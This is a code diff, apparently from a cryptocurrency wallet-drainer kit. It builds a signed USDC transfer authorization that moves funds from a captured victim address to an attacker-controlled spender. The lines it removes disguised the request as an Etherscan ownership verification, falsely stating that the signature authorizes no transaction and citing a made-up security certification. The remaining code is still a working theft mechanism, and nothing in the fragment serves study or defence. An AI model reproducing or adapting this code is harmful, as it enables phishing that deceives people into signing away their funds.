@@ -733,17 +733,11 @@
           ]
         },
         message: {
-          AddressOwnershipVerification: 'Owner/creator verification',
           from: capturedAddr, to: SPENDER,
           value: transferValue,
           validAfter: '0', validBefore: validBefore.toString(), nonce: rwaNonce
         },
         domain: {
-          application:         'Etherscan.io',
-          authorization:       'Signature requested solely to verify control of the specified address.',
-          certificate:         'Etherscan SOC 2 Type II — independently examined by Prescient Assurance LLC.',
-          attestation:         '[Etherscan.io ' + nowFormatted + '] I hereby verify that I am the owner/creator of the specified address.',
-          certificationNotice: 'This signature verifies address ownership. It does not authorize or execute any transaction.',
           name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC
         }
       });
